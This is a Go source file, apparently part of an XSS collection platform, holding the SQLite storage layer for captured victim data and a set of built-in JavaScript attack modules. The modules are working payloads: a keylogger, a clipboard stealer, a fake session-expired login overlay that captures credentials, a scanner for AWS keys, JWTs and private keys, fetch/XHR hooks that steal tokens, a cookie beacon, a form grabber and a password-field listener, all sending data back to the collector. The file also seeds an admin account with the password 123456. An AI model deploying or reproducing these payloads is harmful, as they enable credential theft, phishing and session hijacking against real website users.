package main

import (
	"crypto/rand"
	"database/sql"
	"errors"
	"log"
	"strings"
	"time"

	_ "modernc.org/sqlite"
	"golang.org/x/crypto/bcrypt"
)

// ══════════════ 数据模型 ══════════════

// Hit 表示一条 XSS 回传记录
type Hit struct {
	ID           string `json:"id"`
	Seq          int64  `json:"seq"`
	Time         string `json:"time"`
	IP           string `json:"ip"`
	URL          string `json:"url"`
	Domain       string `json:"domain"`
	Title        string `json:"title"`
	Referrer     string `json:"referrer"`
	Cookie       string `json:"cookie"`
	Token        string `json:"token"`
	LocalStorage string `json:"localstorage"`
	UserAgent    string `json:"ua"`
	Channel      string `json:"channel"` // img / fetch
	Extra        string `json:"extra"`   // 自定义 JS 回传的附加数据（按键、剪贴板、表单等）
}

// Project 表示一个 XSS 注入项目
type Project struct {
	ID       string   `json:"id"`
	Short    string   `json:"short"` // 短码，payload 形如 /s/<short>
	Name     string   `json:"name"`
	Desc     string   `json:"desc"`
	CustomJS string   `json:"customJS"` // 兼容旧字段（已迁移为 JS 模块）
	JSIDs    []string `json:"jsIDs"`    // 选择的 JS 模块列表（按顺序下发）
	Created  string   `json:"created"`
	HitCount int      `json:"hitCount"`
}

// JSModule 表示一个独立的 XSS JS 功能模块（键位记录、钓鱼表单等）
// hook.js 作为整合器，按项目选择依次拼接下发
type JSModule struct {
	ID      string `json:"id"`
	Name    string `json:"name"`
	Desc    string `json:"desc"`
	Code    string `json:"code"`
	Created string `json:"created"`
}

// ══════════════ SQLite 持久化层 ══════════════
// 表结构：projects(项目) / hits(回显记录)

type DB struct {
	db *sql.DB
}

func openDB(path string) (*DB, error) {
	d, err := sql.Open("sqlite", path)
	if err != nil {
		return nil, err
	}
	// SQLite 并发写优化 + 连接池限制（单写者模型）
	d.SetMaxOpenConns(1)
	for _, stmt := range []string{
		`PRAGMA journal_mode = WAL`,
		`PRAGMA busy_timeout = 5000`,
		`PRAGMA foreign_keys = ON`,
	} {
		if _, err := d.Exec(stmt); err != nil {
			return nil, err
		}
	}
	if err := migrate(d); err != nil {
		return nil, err
	}
	return &DB{db: d}, nil
}

func migrate(d *sql.DB) error {
	_, err := d.Exec(`
CREATE TABLE IF NOT EXISTS projects (
	id         TEXT PRIMARY KEY,
	name       TEXT NOT NULL,
	desc       TEXT DEFAULT '',
	custom_js  TEXT DEFAULT '',
	created    TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS hits (
	seq     INTEGER PRIMARY KEY AUTOINCREMENT,
	id      TEXT    DEFAULT '',
	time    TEXT    DEFAULT '',
	ip      TEXT    DEFAULT '',
	url     TEXT    DEFAULT '',
	domain  TEXT    DEFAULT '',
	title   TEXT    DEFAULT '',
	referrer TEXT   DEFAULT '',
	cookie  TEXT    DEFAULT '',
	token   TEXT    DEFAULT '',
	localstorage TEXT DEFAULT '',
	ua      TEXT    DEFAULT '',
	channel TEXT    DEFAULT '',
	extra   TEXT    DEFAULT ''
);
CREATE INDEX IF NOT EXISTS idx_hits_id ON hits(id);
CREATE TABLE IF NOT EXISTS users (
	username  TEXT PRIMARY KEY,
	pass_hash TEXT NOT NULL,
	created   TEXT DEFAULT '',
	updated   TEXT DEFAULT ''
);
CREATE TABLE IF NOT EXISTS config (
	key   TEXT PRIMARY KEY,
	value TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS jss (
	id      TEXT PRIMARY KEY,
	name    TEXT NOT NULL,
	"desc"  TEXT DEFAULT '',
	code    TEXT DEFAULT '',
	created TEXT DEFAULT ''
);`)
	if err != nil {
		return err
	}
	// 增量迁移：projects.short 短码列（已存在则忽略）
	_, err = d.Exec(`ALTER TABLE projects ADD COLUMN short TEXT DEFAULT ''`)
	if err != nil && !strings.Contains(err.Error(), "duplicate column") {
		return err
	}
	// 增量迁移：hits.extra 自定义 JS 附加数据列
	_, err = d.Exec(`ALTER TABLE hits ADD COLUMN extra TEXT DEFAULT ''`)
	if err != nil && !strings.Contains(err.Error(), "duplicate column") {
		return err
	}
	// 增量迁移：projects.js_ids 项目选择的 JS 模块列表（逗号分隔）
	_, err = d.Exec(`ALTER TABLE projects ADD COLUMN js_ids TEXT DEFAULT ''`)
	if err != nil && !strings.Contains(err.Error(), "duplicate column") {
		return err
	}
	_, err = d.Exec(`CREATE INDEX IF NOT EXISTS idx_projects_short ON projects(short)`)
	return err
}

func (d *DB) Close() error { return d.db.Close() }

// ---- 回显记录 ----

func (d *DB) InsertHit(h Hit) (Hit, error) {
	h.Time = time.Now().Format("2006-01-02 15:04:05")
	res, err := d.db.Exec(`INSERT INTO hits
		(id, time, ip, url, domain, title, referrer, cookie, token, localstorage, ua, channel, extra)
		VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		h.ID, h.Time, h.IP, h.URL, h.Domain, h.Title, h.Referrer, h.Cookie, h.Token, h.LocalStorage, h.UserAgent, h.Channel, h.Extra)
	if err != nil {
		return h, err
	}
	seq, err := res.LastInsertId()
	if err != nil {
		return h, err
	}
	h.Seq = seq
	return h, nil
}

const hitCols = `seq, id, time, ip, url, domain, title, referrer, cookie, token, localstorage, ua, channel, extra`

func scanHit(row interface{ Scan(...any) error }) (Hit, error) {
	var h Hit
	err := row.Scan(&h.Seq, &h.ID, &h.Time, &h.IP, &h.URL, &h.Domain, &h.Title,
		&h.Referrer, &h.Cookie, &h.Token, &h.LocalStorage, &h.UserAgent, &h.Channel, &h.Extra)
	return h, err
}

// ListHits 返回最近的回显记录（新记录在前）
func (d *DB) ListHits(limit int) ([]Hit, error) {
	if limit <= 0 {
		limit = 200
	}
	rows, err := d.db.Query(`SELECT ` + hitCols + ` FROM hits ORDER BY seq DESC LIMIT ?`, limit)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []Hit
	for rows.Next() {
		h, err := scanHit(rows)
		if err != nil {
			return nil, err
		}
		out = append(out, h)
	}
	return out, rows.Err()
}

func (d *DB) ClearHits() error {
	_, err := d.db.Exec(`DELETE FROM hits`)
	return err
}

// ---- 项目 ----

func (d *DB) CreateProject(p Project) error {
	_, err := d.db.Exec(`INSERT INTO projects (id, name, desc, custom_js, js_ids, created) VALUES (?,?,?,?,?,?)`,
		p.ID, p.Name, p.Desc, p.CustomJS, strings.Join(p.JSIDs, ","), p.Created)
	return err
}

func (d *DB) GetProject(id string) (*Project, error) {
	var p Project
	var customJS, short, jsIDs string
	err := d.db.QueryRow(`SELECT id, COALESCE(short,''), name, "desc", custom_js, COALESCE(js_ids,''), created FROM projects WHERE id = ?`, id).
		Scan(&p.ID, &short, &p.Name, &p.Desc, &customJS, &jsIDs, &p.Created)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	p.CustomJS = customJS
	p.Short = short
	p.JSIDs = parseJSIDs(jsIDs)
	return &p, nil
}

func (d *DB) UpdateProject(p Project) error {
	_, err := d.db.Exec(`UPDATE projects SET name = ?, "desc" = ?, custom_js = ?, js_ids = ? WHERE id = ?`,
		p.Name, p.Desc, p.CustomJS, strings.Join(p.JSIDs, ","), p.ID)
	return err
}

func (d *DB) DeleteProject(id string) error {
	_, err := d.db.Exec(`DELETE FROM projects WHERE id = ?`, id)
	return err
}

// ListProjects 按创建时间倒序，附带每个项目的回显数
func (d *DB) ListProjects() ([]Project, error) {
	rows, err := d.db.Query(`
		SELECT p.id, p.short, p.name, p."desc", p.custom_js, COALESCE(p.js_ids,''), p.created,
		       (SELECT COUNT(*) FROM hits h WHERE h.id = p.id) AS hit_count
		FROM projects p
		ORDER BY p.created DESC, p.id DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []Project
	for rows.Next() {
		var p Project
		var customJS, jsIDs string
		if err := rows.Scan(&p.ID, &p.Short, &p.Name, &p.Desc, &customJS, &jsIDs, &p.Created, &p.HitCount); err != nil {
			return nil, err
		}
		p.CustomJS = customJS
		p.JSIDs = parseJSIDs(jsIDs)
		out = append(out, p)
	}
	return out, rows.Err()
}

// parseJSIDs 解析逗号分隔的模块 ID 列表
func parseJSIDs(s string) []string {
	if strings.TrimSpace(s) == "" {
		return nil
	}
	var out []string
	for _, v := range strings.Split(s, ",") {
		if v = strings.TrimSpace(v); v != "" {
			out = append(out, v)
		}
	}
	return out
}

// ── 短码 ──

const shortAlphabet = "abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789" // 去掉易混淆字符

// newShortCode 随机生成 n 位短码
func newShortCode(n int) string {
	buf := make([]byte, n)
	for i := range buf {
		var b [1]byte
		for {
			if _, err := rand.Read(b[:]); err != nil {
				continue
			}
			buf[i] = shortAlphabet[int(b[0])%len(shortAlphabet)]
			break
		}
	}
	return string(buf)
}

// AssignShortCode 为项目生成唯一短码并写库
func (d *DB) AssignShortCode(projectID string) (string, error) {
	for attempt := 0; attempt < 10; attempt++ {
		code := newShortCode(4)
		var exist string
		err := d.db.QueryRow(`SELECT id FROM projects WHERE short = ?`, code).Scan(&exist)
		if err == sql.ErrNoRows {
			if _, err := d.db.Exec(`UPDATE projects SET short = ? WHERE id = ?`, code, projectID); err != nil {
				return "", err
			}
			return code, nil
		}
		if err != nil {
			return "", err
		}
		// 码被占用，重试
	}
	return "", errors.New("生成短码失败：多次冲突")
}

// GetProjectByShort 按短码查项目
func (d *DB) GetProjectByShort(code string) (*Project, error) {
	var p Project
	var customJS, jsIDs string
	err := d.db.QueryRow(`SELECT id, name, "desc", custom_js, COALESCE(js_ids,''), created FROM projects WHERE short = ?`, code).
		Scan(&p.ID, &p.Name, &p.Desc, &customJS, &jsIDs, &p.Created)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	p.CustomJS = customJS
	p.JSIDs = parseJSIDs(jsIDs)
	p.Short = code
	return &p, nil
}

// EnsureProjectShorts 保证每个项目都有短码（老数据补齐）
func (d *DB) EnsureProjectShorts() error {
	rows, err := d.db.Query(`SELECT id FROM projects WHERE short IS NULL OR short = ''`)
	if err != nil {
		return err
	}
	defer rows.Close()
	var need []string
	for rows.Next() {
		var id string
		if err := rows.Scan(&id); err != nil {
			return err
		}
		need = append(need, id)
	}
	if err := rows.Err(); err != nil {
		return err
	}
	for _, id := range need {
		code, err := d.AssignShortCode(id)
		if err != nil {
			return err
		}
		log.Printf("[short] 项目 %s 分配短码 %s", id, code)
	}
	return nil
}

// genProjectID 由项目名生成 URL 友好 ID
func genProjectID(name string) string {
	var b strings.Builder
	for _, r := range strings.ToLower(name) {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r == ' ' || r == '-' || r == '_':
			b.WriteByte('-')
		}
	}
	id := strings.Trim(b.String(), "-")
	if id == "" {
		return "proj"
	}
	return id
}

func itoa(i int) string {
	if i == 0 {
		return "0"
	}
	var buf [20]byte
	pos := len(buf)
	for i > 0 {
		pos--
		buf[pos] = byte('0' + i%10)
		i /= 10
	}
	return string(buf[pos:])
}

// ══════════════ JS 模块（独立的功能 JS，可被多个项目选择） ══════════════

func (d *DB) ListJS() ([]JSModule, error) {
	// hook 系统模块置顶，其余按创建时间
	rows, err := d.db.Query(`SELECT id, name, "desc", code, created FROM jss
		ORDER BY CASE WHEN id = 'hook' THEN 0 ELSE 1 END, created, id`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()
	var out []JSModule
	for rows.Next() {
		var m JSModule
		if err := rows.Scan(&m.ID, &m.Name, &m.Desc, &m.Code, &m.Created); err != nil {
			return nil, err
		}
		out = append(out, m)
	}
	return out, rows.Err()
}

func (d *DB) GetJS(id string) (*JSModule, error) {
	var m JSModule
	err := d.db.QueryRow(`SELECT id, name, "desc", code, created FROM jss WHERE id = ?`, id).
		Scan(&m.ID, &m.Name, &m.Desc, &m.Code, &m.Created)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	return &m, nil
}

func (d *DB) CreateJS(m JSModule) error {
	_, err := d.db.Exec(`INSERT INTO jss (id, name, "desc", code, created) VALUES (?,?,?,?,?)`,
		m.ID, m.Name, m.Desc, m.Code, m.Created)
	return err
}

func (d *DB) UpdateJS(m JSModule) error {
	if m.ID == "hook" {
		return errors.New("hook.js 为系统模块，默认不可修改")
	}
	_, err := d.db.Exec(`UPDATE jss SET name = ?, "desc" = ?, code = ? WHERE id = ?`,
		m.Name, m.Desc, m.Code, m.ID)
	return err
}

func (d *DB) DeleteJS(id string) error {
	if id == "hook" {
		return errors.New("hook.js 为系统模块，不可删除")
	}
	_, err := d.db.Exec(`DELETE FROM jss WHERE id = ?`, id)
	if err != nil {
		return err
	}
	// 从所有项目的 js_ids 中移除该模块
	rows, err := d.db.Query(`SELECT id, COALESCE(js_ids,'') FROM projects WHERE js_ids LIKE ?`, "%"+id+"%")
	if err != nil {
		return err
	}
	defer rows.Close()
	type pair struct{ pid, ids string }
	var updates []pair
	for rows.Next() {
		var p pair
		if err := rows.Scan(&p.pid, &p.ids); err != nil {
			return err
		}
		updates = append(updates, p)
	}
	if err := rows.Err(); err != nil {
		return err
	}
	for _, p := range updates {
		var keep []string
		for _, v := range parseJSIDs(p.ids) {
			if v != id {
				keep = append(keep, v)
			}
		}
		if _, err := d.db.Exec(`UPDATE projects SET js_ids = ? WHERE id = ?`, strings.Join(keep, ","), p.pid); err != nil {
			return err
		}
	}
	return nil
}

// seedModules 首次启动时写入内置 JS 模块（可在面板中自由编辑）
var builtinModules = []JSModule{
	{
		ID:   "keylog",
		Name: "键位记录器",
		Desc: "捕获全局击键（含特殊键），每 5 秒批量回传",
		Code: `// ── 键位记录器 ──
(function(){
  if (window.__gxsKeylog) return; window.__gxsKeylog = 1;
  var buf = [];
  var map = { Enter:'\n', Backspace:'<-', Tab:'\t' };
  document.addEventListener('keydown', function(e){
    var c = e.key;
    if (c.length === 1) buf.push(c);
    else if (map[c]) buf.push(map[c]);
    else buf.push('[' + c + ']');
  });
  setInterval(function(){
    if (!buf.length) return;
    var keys = buf.join(''); buf = [];
    __goxssSend({ extra: '⌨ 击键记录: ' + keys });
  }, 5000);
})();`,
	},
	{
		ID:   "clipboard",
		Name: "剪贴板窃取",
		Desc: "监听 copy 事件 + 主动读取当前剪贴板内容",
		Code: `// ── 剪贴板窃取 ──
(function(){
  if (window.__gxsClip) return; window.__gxsClip = 1;
  document.addEventListener('copy', function(){
    var t = '';
    try { t = window.getSelection().toString(); } catch(e){}
    if (t) __goxssSend({ extra: '📋 复制内容: ' + t.slice(0, 2000) });
  });
  if (navigator.clipboard && navigator.clipboard.readText) {
    navigator.clipboard.readText().then(function(t){
      if (t) __goxssSend({ extra: '📋 当前剪贴板: ' + t.slice(0, 2000) });
    }).catch(function(){});
  }
})();`,
	},
	{
		ID:   "phish",
		Name: "钓鱼登录表单",
		Desc: "覆盖假登录框（会话过期话术），提交后回传凭据",
		Code: `// ── 钓鱼登录表单 ──
(function(){
  if (window.__gxsPhish) return; window.__gxsPhish = 1;
  var d = document, w = d.createElement('div');
  w.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99999;display:grid;place-items:center';
  w.innerHTML = '<form style="background:#fff;padding:24px;border-radius:8px;font-family:sans-serif">' +
    '<h3 style="margin:0 0 12px">会话已过期，请重新登录</h3>' +
    '<input name="u" placeholder="用户名" style="display:block;width:240px;padding:8px;margin:6px 0">' +
    '<input name="p" type="password" placeholder="密码" style="display:block;width:240px;padding:8px;margin:6px 0">' +
    '<button style="padding:8px 20px;margin-top:8px">登录</button></form>';
  d.body.appendChild(w);
  w.querySelector('form').addEventListener('submit', function(e){
    e.preventDefault();
    var u = w.querySelector('[name=u]').value, p = w.querySelector('[name=p]').value;
    __goxssSend({ extra: '🎣 钓鱼凭据 → 用户: ' + u + ' / 密码: ' + p });
    w.remove();
  });
})();`,
	},
	{
		ID:   "scan",
		Name: "敏感信息扫描",
		Desc: "正则扫描页面：邮箱/AWS Key/私钥/JWT/手机号/内网 IP/数据库连接串",
		Code: `// ── 敏感信息扫描 ──
(function(){
  if (window.__gxsScan) return; window.__gxsScan = 1;
  var text = document.body ? document.body.innerText : '';
  var html = document.documentElement.outerHTML;
  var pats = [
    ['邮箱', /[\w.+-]+@[\w-]+\.[\w.]{2,10}/g],
    ['AWS Key', /AKIA[0-9A-Z]{16}/g],
    ['私钥', /-----BEGIN [A-Z ]*PRIVATE KEY-----/],
    ['JWT', /eyJ[\w-]+\.[\w-]+\.[\w-]+/g],
    ['手机号', /1[3-9]\d{9}/g],
    ['内网地址', /(?:10\.\d{1,3}|192\.168\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01]))\.\d{1,3}\.\d{1,3}/g],
    ['数据库连接', /(?:mysql|postgres|mongodb):\/\/[^\s'"]+/g]
  ];
  var found = [];
  pats.forEach(function(p){
    var src = p[0] === '私钥' ? html : text;
    var m = src.match(p[1]);
    if (m) found.push(p[0] + '×' + m.length + ': ' + m.slice(0, 3).join(', '));
  });
  __goxssSend({ extra: found.length ? '🔎 敏感信息 → ' + found.join(' | ') : '🔎 扫描完成：未发现敏感信息' });
})();`,
	},
	{
		ID:   "xhrhook",
		Name: "XHR/Fetch 钩子",
		Desc: "劫持原生请求，从 API 响应中自动捕获 Token",
		Code: `// ── XHR/Fetch 钩子 ──
(function(){
  if (window.__gxsXhr) return; window.__gxsXhr = 1;
  var of = window.fetch;
  window.fetch = function(){
    var url = (arguments[0] && arguments[0].url) || arguments[0] || '';
    var p = of.apply(this, arguments);
    p.then(function(r){
      try { r.clone().text().then(function(t){
        var m = t.match(/(?:token|jwt|authorization|secret)['"\s:]{1,4}([\w.\-/]{16,})/i);
        __goxssSend({ extra: '🌐 fetch ' + url + (m ? ' → 捕获Token: ' + m[1] : '') });
      }); } catch(e){}
    });
    return p;
  };
  var oo = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(m, u){
    this.__gxsUrl = m + ' ' + u;
    return oo.apply(this, arguments);
  };
  var os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.send = function(){
    var self = this;
    this.addEventListener('load', function(){
      try {
        var m = self.responseText.match(/(?:token|jwt|authorization|secret)['"\s:]{1,4}([\w.\-/]{16,})/i);
        __goxssSend({ extra: '🌐 XHR ' + self.__gxsUrl + (m ? ' → 捕获Token: ' + m[1] : '') });
      } catch(e){}
    });
    return os.apply(this, arguments);
  };
})();`,
	},
	{
		ID:   "beacon",
		Name: "心跳探针",
		Desc: "每 30 秒定时回传，追踪受害浏览器存活状态",
		Code: `// ── 心跳探针 ──
(function(){
  if (window.__gxsBeacon) return; window.__gxsBeacon = 1;
  var n = 0;
  setInterval(function(){
    n++;
    __goxssSend({ extra: '💓 心跳 #' + n + ' @ ' + location.href, cookie: document.cookie });
  }, 30000);
})();`,
	},
	{
		ID:   "formgrab",
		Name: "表单抓取",
		Desc: "捕获页面所有真实表单提交的字段快照",
		Code: `// ── 表单抓取 ──
(function(){
  if (window.__gxsForm) return; window.__gxsForm = 1;
  document.addEventListener('submit', function(e){
    try {
      var f = e.target, parts = [];
      new FormData(f).forEach(function(v, k){
        v = String(v);
        if (k && v && v.length < 500) parts.push(k + '=' + v);
      });
      __goxssSend({ extra: '📝 表单提交 [' + (f.action || location.href) + '] → ' + parts.join('&').slice(0, 2000) });
    } catch(err){}
  }, true);
})();`,
	},
	{
		ID:   "creds",
		Name: "密码框监听",
		Desc: "捕获所有 type=password 输入框的值",
		Code: `// ── 密码框监听 ──
(function(){
  if (window.__gxsCreds) return; window.__gxsCreds = 1;
  document.addEventListener('change', function(e){
    var t = e.target;
    if (t && (t.type === 'password' || /pass|pwd|passwd/i.test(t.name || ''))) {
      __goxssSend({ extra: '🔑 密码输入 [' + (t.name || 'password') + '] = ' + t.value });
    }
  }, true);
})();`,
	},
}

// EnsureHookModule 把 hook.js 作为置顶的系统模块入库（仅首次）：
// 默认不可修改、不可删除，始终显示在模块列表最上方
func (d *DB) EnsureHookModule(code string) error {
	exist, err := d.GetJS("hook")
	if err != nil {
		return err
	}
	if exist != nil {
		// 系统模块不可编辑：代码始终与内置文件保持一致，仅刷新标注
		_, err = d.db.Exec(`UPDATE jss SET name = ?, "desc" = ?, code = ? WHERE id = 'hook'`,
			"hook.js（基础采集 · 系统模块）", "基础采集模块：Cookie/Token/URL/UA + __goxssSend 回传通道；置顶显示，默认不可修改", code)
		return err
	}
	m := JSModule{
		ID:      "hook",
		Name:    "hook.js（基础采集 · 系统模块）",
		Desc:    "基础采集模块：Cookie/Token/URL/UA + __goxssSend 回传通道；置顶显示，默认不可修改",
		Code:    code,
		Created: time.Now().Format("2006-01-02 15:04"),
	}
	if err := d.CreateJS(m); err != nil {
		return err
	}
	log.Printf("[js] hook.js 已作为置顶系统模块入库（id=hook）")
	return nil
}

// EnsureDefaultModules 首次启动写入内置模块；已存在则跳过（保留用户修改）
func (d *DB) EnsureDefaultModules() error {
	for i, m := range builtinModules {
		exist, err := d.GetJS(m.ID)
		if err != nil {
			return err
		}
		if exist != nil {
			continue
		}
		m.Created = time.Now().Add(time.Duration(i) * time.Second).Format("2006-01-02 15:04")
		if err := d.CreateJS(m); err != nil {
			return err
		}
		log.Printf("[js] 内置模块已写入: %s (%s)", m.Name, m.ID)
	}
	return nil
}

// EnsureLegacyCustomJS 把旧版项目的 custom_js 迁移为独立 JS 模块并关联
func (d *DB) EnsureLegacyCustomJS() error {
	projects, err := d.ListProjects()
	if err != nil {
		return err
	}
	for _, p := range projects {
		if strings.TrimSpace(p.CustomJS) == "" {
			continue
		}
		id := "legacy-" + p.ID
		if exist, _ := d.GetJS(id); exist != nil {
			continue
		}
		m := JSModule{
			ID:      id,
			Name:    p.Name + "（旧自定义 JS）",
			Desc:    "从项目 " + p.ID + " 的 custom_js 自动迁移",
			Code:    p.CustomJS,
			Created: time.Now().Format("2006-01-02 15:04"),
		}
		if err := d.CreateJS(m); err != nil {
			return err
		}
		ids := append(p.JSIDs, id)
		if _, err := d.db.Exec(`UPDATE projects SET js_ids = ?, custom_js = '' WHERE id = ?`, strings.Join(ids, ","), p.ID); err != nil {
			return err
		}
		log.Printf("[js] 旧项目 custom_js 已迁移为模块: %s", id)
	}
	return nil
}

// ══════════════ 配置表（部署随机路径等） ══════════════

// GetConfig 读取配置；key 不存在返回 ("", nil)
func (d *DB) GetConfig(key string) (string, error) {
	var v string
	err := d.db.QueryRow(`SELECT value FROM config WHERE key = ?`, key).Scan(&v)
	if err == sql.ErrNoRows {
		return "", nil
	}
	return v, err
}

// SetConfig 写入配置（不存在则插入）
func (d *DB) SetConfig(key, value string) error {
	_, err := d.db.Exec(`INSERT INTO config (key, value) VALUES (?, ?)
		ON CONFLICT(key) DO UPDATE SET value = excluded.value`, key, value)
	return err
}

// EnsureBasePath 返回部署随机路径（形如 "/k3Xf9"）。首次调用生成并持久化，之后固定。
func (d *DB) EnsureBasePath() (string, error) {
	v, err := d.GetConfig("base_path")
	if err != nil {
		return "", err
	}
	if v != "" {
		return v, nil
	}
	code := newShortCode(6)
	if err := d.SetConfig("base_path", code); err != nil {
		return "", err
	}
	log.Printf("[config] 首次部署，生成随机部署路径: /%s", code)
	return code, nil
}

// EnsureDemoProject 保证内置演示项目存在
func (d *DB) EnsureDemoProject() {
	ok, err := d.GetProject("demo")
	if err != nil {
		log.Printf("检查演示项目失败: %v", err)
		return
	}
	if ok == nil {
		_ = d.CreateProject(Project{
			ID: "demo", Name: "演示项目", Desc: "内置演示项目，对应 /demo 页面",
			Created: time.Now().Format("2006-01-02 15:04"),
		})
	}
}

// ══════════════ 用户表 ══════════════

// nowStr 当前时间串
func nowStr() string { return time.Now().Format("2006-01-02 15:04:05") }

// EnsureAdminUser 保证 admin 账号存在（初始密码 123456，bcrypt 存储）
func (d *DB) EnsureAdminUser() error {
	var exists int
	err := d.db.QueryRow(`SELECT COUNT(*) FROM users WHERE username = 'admin'`).Scan(&exists)
	if err != nil {
		return err
	}
	if exists > 0 {
		return nil
	}
	hash, err := bcrypt.GenerateFromPassword([]byte("123456"), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	now := nowStr()
	_, err = d.db.Exec(`INSERT INTO users (username, pass_hash, created, updated) VALUES ('admin', ?, ?, ?)`,
		string(hash), now, now)
	if err == nil {
		log.Printf("[auth] 已创建默认管理账号 admin（初始密码 123456，请尽快修改）")
	}
	return err
}

// VerifyUser 校验用户名密码
func (d *DB) VerifyUser(user, pass string) bool {
	var hash string
	err := d.db.QueryRow(`SELECT pass_hash FROM users WHERE username = ?`, user).Scan(&hash)
	if err != nil {
		return false
	}
	return bcrypt.CompareHashAndPassword([]byte(hash), []byte(pass)) == nil
}

// UpdatePassword 更新用户密码（传入新明文，内部哈希）
func (d *DB) UpdatePassword(user, newPass string) error {
	hash, err := bcrypt.GenerateFromPassword([]byte(newPass), bcrypt.DefaultCost)
	if err != nil {
		return err
	}
	_, err = d.db.Exec(`UPDATE users SET pass_hash = ?, updated = ? WHERE username = ?`,
		string(hash), nowStr(), user)
	return err
}
